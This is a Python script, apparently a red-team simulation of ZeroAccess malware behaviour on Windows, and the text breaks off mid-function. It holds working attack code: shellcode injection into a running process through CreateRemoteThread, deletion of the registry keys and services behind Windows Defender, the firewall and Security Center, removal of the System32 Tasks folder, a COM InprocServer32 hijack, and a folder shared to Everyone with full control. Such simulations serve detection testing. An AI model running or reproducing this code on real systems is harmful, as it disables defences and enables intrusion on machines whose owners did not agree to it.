# ZeroAccess Red team automation simulation
# Modules used:
# 1 - File_Search - No changes
# 2 - File_Creation_Module - No changes
# 3 - Hidden_Folder - No changes
# 4 - Service_Creation_Module - No changes
# 5 - Registry_Key_Creation_Module - No changes

# Tasks completed:
# 1 - Load dlls
# 2 - Delete registries keys
# 3 - Add new registries keys
# 4 - Find the computer name from the registry
# 5 - Find the Network config from the registry
# 6 - Create new files
# 7 - Make the new recycle bin folder a shared folder
# 8 - Process_Injection (Shellcode) to calc.exe (instead explorer.exe), notepad.exe (instead of services.exe)
# 9 - Start new processes - cmd.exe, rundll32.exe
# 10 - ping google.com
# 11 - network communication to cnc servers (localhost was used instead of the actual ip's) over tcp port 16465
# 12 - Check RPC ports
# 13 - Lateral Movement


# Manually Created:
# 1 - Add/Delete Registry key/value - 10 minutes
# 2 - Create_Shared_Folder - 5 minutes
# 3 - Process_Injection - 20 minutes

# Total Time - 45 hours


import os
import shutil
import socket
import subprocess
import sys
import time
import uuid
from ctypes import *

import Class_C_Scan_Module as ScanC
import common
# ==========Registry imports========
from _winreg import *


def ExecuteAndWriteToCsv(f):
    '''
    This is a decorator function meant to decorate the errors of function objects.
    :param f: function object
    :return: the f function return statement or the error is raised
    '''

    def wrapper(*args, **kwargs):
        result = 0
        IOCArgs = [args[0], args[1], args[2]]
        args = GetFunctionArgs(args)
        try:
            if len(args) > 0:
                result = f(*args, **kwargs)
                row = [common.HOSTNAME, common.gettime(), IOCArgs[0], IOCArgs[1], IOCArgs[2], "Completed"]
            else:  # The function does not get any arguments
                result = f()
                row = [common.HOSTNAME, common.gettime(), IOCArgs[0], IOCArgs[1], IOCArgs[2], "Completed"]
            common.log("The task -%s | %s- was successfully run" % (GetFunctionName(f), str(args)))
        except Exception as err:
            common.log("Error in %s (%s) --> Error code is %s" % (GetFunctionName(f), str(args), str(err)))
            row = [common.HOSTNAME, common.gettime(), IOCArgs[0], IOCArgs[1], IOCArgs[2], "Failed"]
        common.logcsv(row)
        return result

    return wrapper


def OSCommand(*args):
    result = 0
    IOCArgs = [args[0], args[1], args[2]]
    Command = args[3]
    row = []
    try:
        result = os.system(Command)
        if type(result) is int and result != 0:
            row = [common.HOSTNAME, common.gettime(), IOCArgs[0], IOCArgs[1], IOCArgs[2], "Failed"]
            common.log("The command -%s- failed" % Command)
        elif result == 0:
            row = [common.HOSTNAME, common.gettime(), IOCArgs[0], IOCArgs[1], IOCArgs[2], "Completed"]
            common.log("The command -%s- was successfully run" % Command)
    except Exception as err:
        row = [common.HOSTNAME, common.gettime(), IOCArgs[0], IOCArgs[1], IOCArgs[2], "Failed"]
        common.log("The command -%s- failed" % Command)
    common.logcsv(row)


def GetFunctionArgs(FunctionArgs):
    ArgsWithoutIOCArgs = []
    for i in range(3, len(FunctionArgs)):
        ArgsWithoutIOCArgs.append(FunctionArgs[i])
    return ArgsWithoutIOCArgs


def GetFunctionName(f):
    '''
    :param f: Function type
    :return: String rep of the function name
    '''
    return f.__name__


def install(package):
    '''
    Open a new process and try to install the new lib -> pip install 'package'
    :param package: External lib to install | String
    '''
    subprocess.call([sys.executable, "-m", "pip", "install", package])


def GetUserSid():
    common.log("Generting SID...")
    time.sleep(2)
    sid = win32security.ConvertSidToStringSid(win32security.LookupAccountName(None, common.HOSTNAME)[0])
    return str(sid)


def find(name, path):
    '''
    Find a file in the system path
    :param name: String -> File name
    :param path: system path, Example -> C:\
    :return: String -> The path to the file (e.g C:\path\file)
    '''
    common.log("Trying to search for %s..." % name)
    time.sleep(2)
    for root, dirs, files in os.walk(path):
        if name in files and "Recycle" not in root:
            return os.path.join(root, name)


def file_creation(TARGET_APP_NAME=None, TARGET_LOCATION=None):
    '''
    This function will create a new file in the Target path
    :param TARGET_APP_NAME: The name of the new file | String rep
    :param TARGET_LOCATION: The path to the new file | String rep
    '''
    filename = TARGET_LOCATION + "\\" + TARGET_APP_NAME
    common.log("Creating " + filename)
    time.sleep(2)
    status = 0
    if not os.path.exists(filename):
        status = os.system('echo "This file was create by ZeroAccess" > ' + filename)

    return status


@ExecuteAndWriteToCsv
def process_injector(process):
    '''
    This function uses the ctypes lib and inject a shell code to a
    trusted process
    :param process: Trusted process to inject the code to | String Type
    :return: Sucess or Failed
    '''

    common.log("Python code injector: Trying to corrupt " + process)
    time.sleep(2)
    proc = process
    WMI = GetObject('winmgmts:')
    p = WMI.ExecQuery('select * from Win32_Process where Name="%s"' % (proc))
    if len(p) == 0:
        common.log("Process " + proc + " not found, exiting!")
        common.log("Failed")
        sys.exit(0)

    process_id = p[0].Properties_('ProcessId').Value

    shellcode = \
        "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64" \
        "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e" \
        "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60" \
        "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b" \
        "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01" \
        "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d" \
        "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01" \
        "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01" \
        "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89" \
        "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45" \
        "\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff" \
        "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64" \
        "\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56" \
        "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24" \
        "\x52\xe8\x5f\xff\xff\xff\x68\x58\x20\x20\x20\x68\x20\x50" \
        "\x4f\x43\x68\x63\x74\x6f\x72\x68\x49\x6e\x6a\x65\x68\x6f" \
        "\x64\x65\x20\x68\x6f\x6e\x20\x43\x68\x50\x79\x74\x68\x31" \
        "\xdb\x88\x5c\x24\x18\x89\xe3\x68\x72\x67\x58\x20\x68\x6e" \
        "\x61\x2e\x6f\x68\x6f\x72\x74\x75\x68\x72\x65\x61\x66\x68" \
        "\x2e\x61\x6e\x64\x68\x2f\x77\x77\x77\x68\x70\x73\x3a\x2f" \
        "\x68\x20\x68\x74\x74\x68\x72\x67\x20\x2d\x68\x6e\x61\x2e" \
        "\x6f\x68\x6f\x72\x74\x75\x68\x72\x65\x61\x66\x68\x40\x61" \
        "\x6e\x64\x68\x64\x72\x65\x61\x68\x2d\x20\x61\x6e\x68\x75" \
        "\x6e\x61\x20\x68\x46\x6f\x72\x74\x68\x72\x65\x61\x20\x68" \
        "\x20\x41\x6e\x64\x68\x64\x20\x62\x79\x68\x6c\x6f\x70\x65" \
        "\x68\x64\x65\x76\x65\x68\x64\x6c\x79\x20\x68\x50\x72\x6f" \
        "\x75\x31\xc9\x88\x4c\x24\x5e\x89\xe1\x31\xd2\x52\x53\x51" \
        "\x52\xff\xd0\x31\xc0\x50\xff\x55\x08"

    process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, process_id)

    if not process_handle:
        common.log("Couldn't acquire a handle to PID: %s" % process_id)
        common.log("Fail")
        sys.exit(0)

    memory_allocation_variable = windll.kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), 0x00001000, 0x40)
    windll.kernel32.WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, len(shellcode), 0)

    if not windll.kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0):
        common.log("Failed to inject shellcode. Exiting.")
        sys.exit(0)

    common.log("Success!")


@ExecuteAndWriteToCsv
def write_reg_string(hive, key, value, data, delete=True):
    common.log("Writing new values to %s..." % key)
    time.sleep(2)
    hkey = CreateKey(hive, key)
    key = key.rstrip('\\')
    common.log("Writing to registry %s\\%s -> %s" % (key, value, data))
    SetValueEx(hkey, value, 0, REG_SZ, data)
    stored, code = QueryValueEx(hkey, value)
    if data != stored:
        common.log("Wrote %s but retrieved %s" % (data, stored), log_type="-")

    hkey.Close()
    print("")


@ExecuteAndWriteToCsv
def http_from_process(name, ip, port):
    common.log("Trying to open http session from legitimate process %s..." % name)
    time.sleep(2)
    path = "{Full path of proccess}" + name
    common.log("Making HTTP GET from %s" % path)
    shutil.copy(sys.executable, path)
    common.execute([path, "-c", "import urllib; urllib.urlopen('http://%s:%d')" % (ip, port)])
    common.remove_file(path)


@ExecuteAndWriteToCsv
def DeleteRegValueOrKey(Key, value=None):
    common.log("Try to delete the values of %s..." % Key)
    time.sleep(2)
    if value is not None:
        return os.system("reg delete %s /v %s /f" % (Key, value))  # return 0 if successful
    else:
        return os.system("reg delete %s /f" % Key)  # return 0 if successful


@ExecuteAndWriteToCsv
def AddRegValueOrKey(Key, value=None):
    common.log("Trying to add new value to %s" % Key)
    time.sleep(2)
    if value is not None:
        return os.system("reg add %s /v %s /t REG_SZ /d calc.exe" % (Key, value))  # return 0 if successful
    else:
        return os.system("reg add %s " % Key)  # return 0 if successful


def HKLMGetRegistryKeyNumberOfValues(key):
    common.log("Getting the numbert of value of registry key -%s-..." % key)
    time.sleep(2)
    KeyHandle = OpenKey(HKEY_LOCAL_MACHINE, key, 0, KEY_READ)
    NumberOfValues = QueryInfoKey(KeyHandle)[1]
    CloseKey(KeyHandle)
    return NumberOfValues


@ExecuteAndWriteToCsv
def HKLMGetRegistryKeyValues(key):
    common.log("Searching for the registry key %s values..." % key)
    time.sleep(2)
    KeyHandle = OpenKey(HKEY_LOCAL_MACHINE, key, 0, KEY_READ)
    Data = []
    NumberOfValues = HKLMGetRegistryKeyNumberOfValues(key)
    for i in range(NumberOfValues):
        Data.append(EnumValue(KeyHandle, i)[1])
    return Data  # Return a list containg all the data of the key values


@ExecuteAndWriteToCsv
def RPCPortOpenOrClosed():
    common.log("Checking the RPC port status")
    time.sleep(2)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('127.0.0.1', 135))
    sock.settimeout(2)
    if result == 0:
        common.log("Port 135 is open")
        return True
    else:
        common.log("Port 135 is closed")
        return False


install("pywin32")
from win32com.client import GetObject
import win32security


def main():
    common.log("#################################################")
    time.sleep(2)

    # ******************* Set attack's variables *******************
    system32_path = "C:\\Windows\\System32"
    ps_exec_path = find("PsExec.exe", "C:\\")
    on_trigger = 0x00000001
    off_trigger = 0x00000000

    # ******************* Find files under C:\ drive *******************
    common.log("Searching for files:")
    time.sleep(2)
    FilesToFind = ["mtdlk.dll", "ltdlj.dll", "ktdli.dll", "jtdlh.dll", "itdlg.dll", "htdlf.dll", "gtdle.dll",
                   "htdlf.dll", "ftdld.dll", "gtdle.dll", "etdlc.dll", "dtdlb.dll", "ctdla.dll", "btdlw.dll",
                   "atdl_.dll", "`tdl^.dll", "_tdl].dll", "^tdl\.dll", "FD43u.dll", "O.dll"]
    # for file in FilesToFind:
    #     result = find(file, "C:\\")
    #     if result is None:
    #         row = [common.HOSTNAME, common.gettime(), "File", "C:\\", "Updated", "Failed"]
    #     elif result != None:
    #         row = [common.HOSTNAME, common.gettime(), "File", "C:\\" + result, "Updated", "Completed"]
    #     common.logcsv(row)
    # common.log("#################################################")

    # ******************* Create new files *******************
    common.log("Creating new files:")
    time.sleep(2)

    recycle_sid = GetUserSid()
    new_recycle_path = "%Homedrive%%Homepath%\\Desktop\\Recycle Bin"
    zero_access_hash_value = str(hash("ZeroAccess"))
    new_recycle_sid_path = new_recycle_path + "\\" + recycle_sid
    new_recycle_sid_hash_path = new_recycle_sid_path + "\\" + zero_access_hash_value

    OSCommand("Folder", new_recycle_path, "Created", 'mkdir "%s"' % new_recycle_path)

    time.sleep(2)
    OSCommand("Folder", new_recycle_sid_path, "Created", 'mkdir "%s"' % new_recycle_sid_path)

    time.sleep(2)
    OSCommand("Folder", new_recycle_sid_hash_path, "Created", 'mkdir "%s"' % new_recycle_sid_hash_path)

    time.sleep(2)
    OSCommand("Folder", new_recycle_sid_hash_path + "\\U", "Created", 'mkdir "%s\\U"' % new_recycle_sid_hash_path)

    time.sleep(2)
    OSCommand("Folder", new_recycle_sid_hash_path + "\\L", "Created", 'mkdir "%s\\L"' % new_recycle_sid_hash_path)

    time.sleep(2)
    status = file_creation("n.dll" + '"', '"' + new_recycle_sid_hash_path)
    if status == 0:
        row = [common.HOSTNAME, common.gettime(), 'File', new_recycle_sid_hash_path + "\\n.dll", 'Created', 'Completed']
    else:
        row = [common.HOSTNAME, common.gettime(), 'File', new_recycle_sid_hash_path + "\\n.dll", 'Created', 'Failed']
    common.logcsv(row)

    time.sleep(2)
    status = file_creation("@.dll" + '"', '"' + new_recycle_sid_hash_path)
    if status == 0:
        row = [common.HOSTNAME, common.gettime(), 'File', new_recycle_sid_hash_path + "\\@.dll", 'Created', 'Completed']
    else:
        row = [common.HOSTNAME, common.gettime(), 'File', new_recycle_sid_hash_path + "\\@.dll", 'Created', 'Failed']
    common.logcsv(row)

    time.sleep(2)
    status = file_creation("z.exe", system32_path)
    if status == 0:
        row = [common.HOSTNAME, common.gettime(), 'File', system32_path + "\\z.exe", 'Created', 'Completed']
    else:
        row = [common.HOSTNAME, common.gettime(), 'File', system32_path + "\\z.exe", 'Created', 'Failed']

    common.logcsv(row)
    time.sleep(2)
    common.log("#################################################")

    # ******************* Delete C:\Windows\System32\Tasks dir *******************
    common.log("Deleting files:")
    time.sleep(2)
    common.log("Deleting C:\\Windows\\System32\\Tasks...")
    time.sleep(2)
    OSCommand("Folder", "c:\\windows\system32", "Deleted", "rmdir %s\\Tasks /Q /S" % system32_path)
    common.log("#################################################")

    # ******************* Change permission of imm32.dll *******************
    common.log("Trigger file change by changing C:\\Windows\\System32\\imm32.dll...")
    time.sleep(2)
    os.system("icacls C:\\Windows\\System32\\imm32.dll /grant %username%:F")  # Change permission to imm32.dll
    OSCommand("File", system32_path, "Uptdated", "attrib +h %s\\imm32.dll" % system32_path)
    common.log("#################################################")

    # ******************* Share Recycle Bin *******************
    common.log("Making the Recycle Bin a shared folder named $Recycle.Bin...")
    time.sleep(1)
    OSCommand("Folder", "%Homedrive%%Homepath%\\desktop", "Updated",
              'net share $Recycle.Bin="%Homedrive%%Homepath%\\desktop\\Recycle Bin" /GRANT:Everyone,FULL')
    common.log("#################################################")

    # ******************* Get information from registries *******************
    common.log("Checking for the computer name from the registry:" + "\n" +
               "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName")
    time.sleep(2)
    key = "SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName"
    ComputerName = HKLMGetRegistryKeyValues("Registry", "HKEY_LOCAL_MACHINE\\%s" % key, "Updated", key)[1]

    common.log("Checking for the network config from the registry:" + "\n" +
               "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Network")
    time.sleep(2)
    key = "SYSTEM\CurrentControlSet\Control\Network"
    NetworkConfig = HKLMGetRegistryKeyValues("Registry", "HKEY_LOCAL_MACHINE\\%s" % key, "Updated", key)
    common.log("#################################################")

    # ******************* Loading rsaenh.dll and crypysp.dll *******************
    time.sleep(2)
    dll_names = ["rsaenh.dll", "crypysp.dll"]
    for dll_name in dll_names:
        common.log("Loading " + dll_name + "...")
        dll_path = system32_path + "\\" + dll_name
        try:
            res = WinDLL(dll_path)
            row = [common.HOSTNAME, common.gettime(), "File", dll_path, "Updated", "Completed"]
        except Exception as e:
            common.log("Failed to load " + dll_name)
            row = [common.HOSTNAME, common.gettime(), "File", dll_path, "Updated", "Failed - " + str(e)]
        common.logcsv(row)
    common.log("#################################################")

    # ******************* Delete registries *******************
    registrys_to_delete = [
        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellServiceObjects",
        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Schedule\\TaskCache\\Tasks",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\BFE",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\iphlpsvc",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\MpsSvc",
        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Schedule\\TaskCache\\Plain",
        '"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\windows Defender\\MP Scheduled Scan"',
        '"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\windows Defender\\MpIdleTask"',
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\SharedAccess\\Defaults",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\SharedAccess\\Epoch2",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\SharedAccess\\Parameters\\FirewallPolicy",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\WinDefend",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\escsvc",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\Security",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\services\\MpsSvc\\Parameters\\PortKeywords\\DHCP",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\services\\MpsSvc\\Parameters\\PortKeywords\\IPTLSIn",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\services\\MpsSvc\\Parameters\\PortKeywords\\IPTLSOut",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\services\\MpsSvc\\Parameters\\PortKeywords\\Teredo"
        ]
    common.log("Deleting registries keys...")
    time.sleep(2)
    for key in registrys_to_delete:
        time.sleep(2)
        DeleteRegValueOrKey("Registry", key, "Delete", key)
    common.log("#################################################")

    # ******************* Add keys to HKEY_CURRENT_USER *******************
    registrys_to_add = ["S-1-5-18\\Software\\Classes\\clsid",
                        "S-1-5-18\\Software\\Classes\clsid\\%s" % uuid.uuid4(),
                        "S-1-5-18\\Software\\Classes\clsid\\%s" % uuid.uuid4(),
                        "sid_Classes\\clsid\\%s" % uuid.uuid4(),
                        "sid_Classes\\clsid\\%s" % uuid.uuid4()]
    common.log("Adding registries keys...")
    time.sleep(2)
    calc_path = "C:\\windows\\system32\\calc.exe"
    for key in registrys_to_add:
        time.sleep(2)
        write_reg_string("Registry", key, "Created", HKEY_CURRENT_USER, key, "Test", calc_path)

    # ******************* Add keys to HKEY_LOCAL_MACHINE *******************
    # Adding HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\sid\InprocServer32\: %systemroot%\system32\wbem\fastprox.dll
    # in order to delete it later and raise the 'delete registry key trigger'
    os.system(
        "reg add HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\{0000002F-0000-0000-C000-000000000041}\\InprocServer32")
    os.system(
        "reg add HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\{0000002F-0000-0000-C000-000000000041}\\InprocServer32 " \
        "/v Data /t REG_EXPAND_SZ /d %s\\webem\\fastprox.dll" % system32_path)
    common.log("#################################################")

    # ******************* Delete keys from HKEY_LOCAL_MACHINE *******************
    common.log("Deleting registries values...")
    time.sleep(2)
    # Delete HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\sid\InprocServer32\: %systemroot%\system32\wbem\fastprox.dll
    # that was created manually
    OSCommand("Registry",
              "HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\{0000002F-0000-0000-C000-000000000041}\\InprocServer32",
              "Deleted",
              "reg delete HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\{0000002F-0000-0000-C000-000000000041}\\InprocServer32 /v Data /f")

    common.log(
        "Delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects\(Auto Start)...")
    time.sleep(2)
    aKey = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects", 0,
                   KEY_ALL_ACCESS)
    key = ""
    try:
        i = 0
        while True:
            asubkey = EnumKey(aKey, i)  # Return the subkey in string type
            key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects" + "\\" + asubkey
            SubKeyHandle = OpenKey(HKEY_LOCAL_MACHINE, key, 0, KEY_READ)
            if QueryInfoKey(SubKeyHandle)[1] != 0:  # Key[1] - The number of values the key posses
                if EnumValue(SubKeyHandle, 0)[0] == "AutoStart":
                    os.system('reg delete "%s" /v AutoStart /f' % key)  # Delete only the AutoStart Value
            CloseKey(SubKeyHandle)
            i += 1
            row = [common.HOSTNAME, common.gettime(), 'Registry', key, 'Deleted', 'Completed']
            common.log("Success in deleting %s" % key)
            time.sleep(2)
            common.logcsv(row)
    except Exception as err:
        common.log(str(err))
        row = [common.HOSTNAME, common.gettime(), 'Registry', key, 'Deleted', 'Failed']
        common.logcsv(row)

    CloseKey(aKey)

    common.log(
        "Deleting HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\(Windows Defender Tasks...")
    time.sleep(2)
    aKey = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks",
                   0, KEY_READ)
    try:
        i = 0
        while True:

            asubkey = EnumKey(aKey, i)  # Return the subkey in string type
            key = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks" + "\\" + asubkey
            SubKeyHandle = OpenKey(HKEY_LOCAL_MACHINE, key, 0, KEY_READ)
            if QueryInfoKey(SubKeyHandle)[1] != 0:  # QueryInfoKey(key)[1] - The number of values the key posses
                if "Windows Defender" in EnumValue(SubKeyHandle, 0)[0]:
                    # Delete only the Windows Defender Value
                    os.system("reg delete %s /v %s /f" % (key, EnumValue(SubKeyHandle, 0)[0]))

            CloseKey(SubKeyHandle)
            i += 1

            row = [common.HOSTNAME, common.gettime(), 'Registry', key, 'Deleted', 'Completed']
            common.log("Success in deleting %s" % key)
            time.sleep(2)
            common.logcsv(row)
    except Exception as err:
        common.log(str(err))
        row = [common.HOSTNAME, common.gettime(), 'Registry', key, 'Deleted', 'Failed']
        common.logcsv(row)

    CloseKey(aKey)

    # ******************* Delete keys from HKEY_LOCAL_MACHINE *******************
    registrys_values_to_delete = [
        '"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows Defender\\MP Scheduled"',
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\WMI\\Security",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\BFE",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\iphlpsvc",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\MpsSvc",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\SharedAccess\\Defaults\\FireWallPolicy",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\WinDefend",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\wscsv",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\Epoch",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services\\Epoch2"
    ]
    for key in registrys_values_to_delete:
        DeleteRegValueOrKey("Registry", key, "Deleted", key)
    common.log("#################################################")

    # ******************* Adding values to registries *******************
    common.log("Adding new values to exsisting registries...")
    time.sleep(1)

    common.log(
        "Adding value to HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\{0000002F-0000-0000-C000-000000000041}\\InprocServer32")
    time.sleep(2)

    KeyHandle = OpenKey(HKEY_LOCAL_MACHINE,
                        "Software\\Classes\\CLSID\\{0000002F-0000-0000-C000-000000000041}\\InprocServer32",
                        0, KEY_ALL_ACCESS)
    try:
        SetValueEx(KeyHandle, None, 0, REG_SZ,
                   '"%Homedrive%%Homepath%\\desktop\\Recycle Bin\\"' + recycle_sid)
        row = [common.HOSTNAME, common.gettime(), "Registry",
               "HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\{0000002F-0000-0000-C000-000000000041}\\InprocServer32",
               "Created", "Completed"]
    except Exception as err:
        common.log(str(err))
        row = [common.HOSTNAME, common.gettime(), "Registry",
               "HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\{0000002F-0000-0000-C000-000000000041}\\InprocServer32",
               "Created", "Failed"]
    common.logcsv(row)
    CloseKey(KeyHandle)

    common.log("Adding value to HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\SharedAccess")
    time.sleep(2)
    KeyHandle = OpenKey(HKEY_LOCAL_MACHINE, "System\\ControlSet001\\Services\\SharedAccess", 0, KEY_ALL_ACCESS)
    try:
        SetValueEx(KeyHandle, "DeleteFlag", 0, REG_DWORD, off_trigger)
        row = [common.HOSTNAME, common.gettime(), "Registry",
               "HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\SharedAccess", "Created", "Completed"]
    except Exception as err:
        common.log(str(err))
        row = [common.HOSTNAME, common.gettime(), "Registry",
               "HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\SharedAccess", "Created", "Failed"]
    common.logcsv(row)
    CloseKey(KeyHandle)

    common.log("Adding value to HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\SharedAccess")
    time.sleep(2)
    KeyHandle = OpenKey(HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Services\\SharedAccess", 0, KEY_ALL_ACCESS)
    try:
        SetValueEx(KeyHandle, "DeleteFlag", 0, REG_DWORD, on_trigger)
        row = [common.HOSTNAME, common.gettime(), "Registry",
               "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\SharedAccess", "Created", "Completed"]
    except Exception as err:
        common.log(str(err))
        row = [common.HOSTNAME, common.gettime(), "Registry",
               "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\SharedAccess", "Created", "Failed"]

    CloseKey(KeyHandle)
    common.logcsv(row)
    common.log("#################################################")

    # ******************* Modify registries *******************
    common.log("Modifying existing registries values...")
    time.sleep(1)

    common.log("Modifying The ErrorControl value on HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\SharedAccess")
    time.sleep(2)
    KeyHandle = OpenKey(HKEY_LOCAL_MACHINE, "System\\ControlSet001\\Services\\SharedAccess", 0, KEY_ALL_ACCESS)
    try:
        SetValueEx(KeyHandle, "ErrorControl", 0, REG_DWORD, off_trigger)
        row = [common.HOSTNAME, common.gettime(), "Registry",
               "HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\SharedAccess", "Updated", "Completed"]
    except Exception as err:
        common.log(str(err))
        row = [common.HOSTNAME, common.gettime(), "Registry",
               "HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\SharedAccess", "Updated", "Failed"]
    common.logcsv(row)
    CloseKey(KeyHandle)

    common.log(
        "Modifying The ErrorControl value on HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\SharedAccess")
    time.sleep(2)
    KeyHandle = OpenKey(HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Services\\SharedAccess", 0, KEY_ALL_ACCESS)
    try:
        SetValueEx(KeyHandle, "ErrorControl", 0, REG_DWORD, off_trigger)
        row = [common.HOSTNAME, common.gettime(), "Registry",
               "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\SharedAccess", "Updated", "Completed"]
    except Exception as err:
        common.log(str(err))
        row = [common.HOSTNAME, common.gettime(), "Registry",
               "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\SharedAccess", "Updated", "Failed"]

    common.logcsv(row)
    CloseKey(KeyHandle)

    common.log("Modifying The ErrorControl value on HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center\cval")
    time.sleep(2)
    KeyHandle = OpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Security Center", 0, KEY_ALL_ACCESS)
    try:
        SetValueEx(KeyHandle, "cval", 0, REG_DWORD, off_trigger)
        row = [common.HOSTNAME, common.gettime(), "Registry",
               "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center", "Updated", "Completed"]
    except Exception as err:
        common.log(str(err))
        row = [common.HOSTNAME, common.gettime(), "Registry",
               "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center", "Updated", "Failed"]

    common.logcsv(row)
    CloseKey(KeyHandle)

    common.log(
        "Modifying The ErrorControl value on HKEY_CURRENT_USER\SOFTWARE\microsoft\windows\currentVersion\Action Center")
    time.sleep(2)
    KeyHandle = OpenKey(HKEY_CURRENT_USER, "software\microsoft\windows\currentVersion\Action Center", 0, KEY_ALL_ACCESS)
    try:
        SetValueEx(KeyHandle, "ReNotifyCount", 0, REG_DWORD, off_trigger)
        row = [common.HOSTNAME, common.gettime(), "Registry",
               "HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentVersion\\Action Center", "Updated", "Completed"]
